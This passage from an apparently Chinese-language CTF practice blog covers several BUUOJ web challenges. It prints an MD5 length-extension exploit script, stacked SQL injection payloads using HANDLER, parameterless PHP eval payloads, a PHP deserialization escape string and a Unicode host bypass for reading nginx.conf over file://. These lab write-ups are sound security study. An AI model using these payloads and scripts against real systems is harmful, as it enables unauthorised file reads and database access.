f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>在<code>/De1ta</code>路由下</p><p>第一关要绕过waf，不能用 <code>gopher</code>和<code>file</code>协议，但urllib模块支持 <code>local_file</code>协议，而且题目告诉<code>flag</code>在 <code>./flag.txt</code>。</p><p>一般情况下,<code>local_file:flag.txt</code>是相对路径，<code>local_file:///flag.txt</code>则是绝对路径。</p><p>第二关则要绕md5校验</p><p>关键在<code>getSign(self.action, self.param) == self.sign</code>，而<code>getSign()</code> 相当于<code>md5(secert_key + param + action)</code> ，<code>secert_key</code>是脚本随机生成的16位字符串。</p><p>在<code>/geneSign</code>路由下提交<code>param=local_file:flag.txt</code>得到<code>md5(secert_key + local_file:flag.txt + scan)</code>既<code>fefdccdd74fd9e221ea27ca5458d45c7</code></p><p>然后使用 <code>hashpump</code>构造字符串</p><p><img src="/2020/08/8月刷题记录/image-20200809223529285.png" alt="image-20200809223529285"></p><p><img src="/2020/08/8月刷题记录/image-20200809223624980.png" alt="image-20200809223624980"></p><p>因为 <code>param(local_file:flag)</code> 会在服务端拼接，所以<code>action</code>删除要<code>local_file:flag</code>字段</p><p>@一叶飘零师傅的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*- </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">'local_file:///proc/self/cwd/flag.txt'</span></span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://a07ad6bf-0c49-4483-8f5f-9b268185cc87.node3.buuoj.cn/geneSign?param='</span>+url)</span><br><span class="line">old_sign = r.content</span><br><span class="line">new_sign = hashpumpy.hashpump(old_sign, url + <span class="string">'scan'</span>, <span class="string">'read'</span>, <span class="number">16</span>)</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">'sign'</span>: new_sign[<span class="number">0</span>],</span><br><span class="line"><span class="string">'action'</span>: urllib.quote(new_sign[<span class="number">1</span>][len(url):])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://a07ad6bf-0c49-4483-8f5f-9b268185cc87.node3.buuoj.cn/De1ta?param='</span>+url, cookies=cookies)</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure><h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>堆叠注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br><span class="line">1'; <span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> FlagHere; <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>flag就在表<code>FlagHere</code>中</p><p>过滤如下：</p><p><code>preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p><p>set被禁，不能用进制绕过</p><p>利用handler绕过，payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'; <span class="keyword">handler</span> FlagHere <span class="keyword">open</span> <span class="keyword">as</span> <span class="string">`a`</span>; <span class="keyword">handler</span> <span class="string">`a`</span> <span class="keyword">read</span> <span class="keyword">next</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p>啥也没有，最后扫目录</p><p><img src="/2020/08/8月刷题记录/image-20200809235401850.png" alt="image-20200809235401850"></p><p>githack还原文件</p><p><img src="/2020/08/8月刷题记录/image-20200810000328848.png" alt="image-20200810000328848"></p><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>无参RCE</p><p><code>et</code>被禁 <code>getenv()</code> <code>getallheaders()</code>  <code>get_defined_vars()</code> 都用不了</p><p>读取文件，不能使用<code>file_get_contents()</code>，但是可以可以使用<code>readfile()</code>或<code>highlight_file()</code>以及其别名函数<code>show_source()</code></p><p>这里使用 session_id()</p><p>本题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。<br>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。<br>session_id()可以获取到当前的session id。</p><p>其他payload</p><p><code>exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></p><p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>.</code></p><p>current() 返回数组中的当前单元, 默认取第一个值。pos() 是current() 的别名。</p><p>array_reverse() 以相反的元素顺序返回数组</p><p><img src="/2020/08/8月刷题记录/image-20200810002921599.png" alt="image-20200810002921599"></p><p><code>highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code> //多刷新几次</p><p>array_flip()交换数组的键和值</p><p>array_rand()从数组中随机取出一个或多个单元</p><h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h3><p>SQL注入，抓包，页面源码都没有有用的信息，后面扫目录拿到源码</p><p>其中config.php有$flag变量，所以应该是读取服务端 config.php文件。</p><p>根据update.php <code>$profile[&#39;nickname&#39;]</code>变量通过传参数组可以绕过<code>die()</code>，从而可控<code>nickname</code></p><p>接着是反序列化 <code>$profile</code> </p><p><code>$user-&gt;update_profile($username, serialize($profile));</code></p><p>反序列化的字符串可控，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//PHP序列化长度变化导致字符逃逸</span></span><br><span class="line"><span class="comment">//PHP反序列化中值的字符读取多少其实是由表示长度的数字控制的，而且只要整个字符串的前一部分能够成功反序列化，这个字符串后面剩下的一部分将会被丢弃</span></span><br><span class="line">$s = <span class="string">"Hello World"</span>;</span><br><span class="line">$a = <span class="keyword">array</span>($s);</span><br><span class="line">var_dump(serialize($a)); <span class="comment">//string(29) "a:1:&#123;i:0;s:11:"Hello World";&#125;"</span></span><br><span class="line">$fake = <span class="string">'a:1:&#123;i:0;s:7:"Hello "";&#125;World";&#125;'</span>;</span><br><span class="line">var_dump(unserialize($fake)); <span class="comment">//string(7) "Hello ""</span></span><br><span class="line"><span class="comment">//我们可以看到，原来的字符串"Hello World"内 "World"改成了一个双引号，s:11 改成 s:7 再是正常结尾时需要有的 ";&#125; 三个字符</span></span><br><span class="line"><span class="comment">//在PHP进行反序列化时，由字符串初始位置向后读取7个字符，即使遇到字符串分解符单双引号也会继续向下读，而后遇到了正常的结束符，达成了正常反序列化的条件，反序列化结束，</span></span><br><span class="line"><span class="comment">//后面的 World";&#125;  几个字符均被丢弃。</span></span><br></pre></td></tr></table></figure><p>虽然<code>$profile[&#39;nickname&#39;]</code>可控，但序列化是在服务器端，<code>s</code>的长度无法控制，也就无法逃逸</p><p>慢慢看源码</p><p>接着在<code>profile.php</code>调用了</p><p><code>$profile=$user-&gt;show_profile($username);</code></p><p>这个<code>show_proflie()</code>具体如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">    $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">    $new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line">    $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意<code>filter()</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span>//<span class="title">class</span>.<span class="title">php</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>); <span class="comment">// ' 和 \\ 字符</span></span><br><span class="line">        $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>; <span class="comment">// "/'|\\/"</span></span><br><span class="line">        $string = preg_replace($escape, <span class="string">'_'</span>, $string); <span class="comment">//  ' 和 \\ 替换成 _</span></span><br><span class="line">        $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">        $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>; <span class="comment">// "/select|insert|update|delete|where/i"</span></span><br><span class="line">        <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string); <span class="comment">//同理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 <code>$profile</code>存入数据库未被过滤，取出数据库时却被过滤了</p><p>而如果将<code>where</code>替换成 <code>hacker</code> 例如</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"where"</span> &gt;&gt; <span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"hacker"</span>&gt;&gt;反序列化 <span class="selector-tag">hacke</span>，<span class="selector-tag">r</span>则可以按我们的意愿修改，这样在不修改<span class="selector-tag">s</span>的情况下，控制了反序列化</span><br></pre></td></tr></table></figure><p>接下来的插入数据其实和SQL注入很像，利用 <code>&quot;;}</code>闭合前一部分，接着注入数据</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"66666666666"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">11</span>:<span class="string">"test@qq.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;a:<span class="number">1</span>:&#123;<span class="built_in">i</span>:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">"here"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">39</span>:<span class="string">"upload/098f6bcd4621d373cade4e832627b4f6"</span>;&#125;'</span><br><span class="line">在here后面闭合即</span><br><span class="line">&#123;<span class="built_in">i</span>:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">"here"</span>;&#125;                                                           <span class="string">"&#125;</span></span><br><span class="line"><span class="string">插入数据</span></span><br><span class="line"><span class="string">&#123;i:0;s:4:"</span>here<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;                            "</span>&#125;</span><br></pre></td></tr></table></figure><p>所以我们要插入 <code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>长度为34，即我们需要34个where</p><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phone=<span class="string">"66666666666"</span>;</span><br><span class="line">$email = <span class="string">"test@qq.com"</span>;</span><br><span class="line">$nickname=<span class="keyword">array</span>(<span class="string">'wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";&#125;s:5:"photo";s:10:"config.php";&#125;'</span>);</span><br><span class="line">$file = <span class="keyword">array</span>(<span class="string">"size"</span>=&gt;<span class="string">"10"</span>,<span class="string">"name"</span>=&gt;<span class="string">"test"</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $phone))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $email))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $nickname) || strlen($nickname) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$profile[<span class="string">'phone'</span>] = $phone;</span><br><span class="line">$profile[<span class="string">'email'</span>] = $email;</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $nickname;</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line">var_dump(serialize($profile));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$profile = <span class="string">'a:4:&#123;s:5:"phone";s:11:"66666666666";s:5:"email";s:11:"test@qq.com";s:8:"nickname";a:1:&#123;i:0;s:204:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";&#125;s:5:"photo";s:10:"config.php";&#125;";&#125;s:5:"photo";s:39:"upload/098f6bcd4621d373cade4e832627b4f6";&#125;'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span>//<span class="title">class</span>.<span class="title">php</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>); <span class="comment">// ' 和 \\ 字符</span></span><br><span class="line">        $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>; <span class="comment">// "/'|\\/"</span></span><br><span class="line">        $string = preg_replace($escape, <span class="string">'_'</span>, $string); <span class="comment">//  ' 和 \\ 替换成 _</span></span><br><span class="line">        $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">        $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>; <span class="comment">// "/select|insert|update|delete|where/i"</span></span><br><span class="line">        <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string); <span class="comment">//同理</span></span><br><span class="line">true&#125;</span><br><span class="line">$profile = filter($profile);</span><br><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line">var_dump($profile[<span class="string">'photo'</span>]);</span><br><span class="line">var_dump($photo);</span><br></pre></td></tr></table></figure><p><img src="/2020/08/8月刷题记录/image-20200810140642188.png" alt="image-20200810140642188"></p><h3 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h3><p><code>blackhat</code>议题之一<code>HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization</code></p><p><img src="/2020/08/8月刷题记录/1828215-20200113142549010-1977431520.png" alt="1828215-20200113142549010-1977431520"></p><p>根据源码写爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urlunsplit, urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65535</span>):</span><br><span class="line">        uni = chr(x)</span><br><span class="line">        url = <span class="string">"http://suctf.c&#123;&#125;"</span>.format(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line"></span><br><span class="line">                print(parse.quote(chr(x))+<span class="string">" str: "</span> + uni + <span class="string">' unicode: \\u'</span> + str(hex(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">(url)</span>:</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure><p>题目提示我们是nginx，所以我们去读取nginx的配置文件</p><p>这里读的路径是 /usr/local/nginx/conf/nginx.conf</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">94</span>cc5e34-bb0b-<span class="number">44</span>bb-b029-ca087a23f0b6.node3.buuoj.cn<span class="regexp">/getUrl?url=file:/</span><span class="regexp">/suctf.c%E2%84%82/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">//u</span>sr<span class="regexp">/local/</span>nginx<span class="regexp">/conf/</span>nginx.conf</span><br></pre></td></tr></table></figure><p>然后读flag就行</p><p>另外一种<a href="https://xz.aliyun.com/t/6281" target="_blank" rel="noopener">思路</a>是突破<code>urlunsplit</code> </p><p>函数定义在 <code>urllib\parse.py</code> 中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">urlunsplit</span><span class="params">(components)</span>:</span></span><br><span class="line">    scheme, netloc, url, query, fragment, _coerce_result = (</span><br><span class="line">                                          _coerce_args(*components))</span><br><span class="line">    <span class="keyword">if</span> netloc 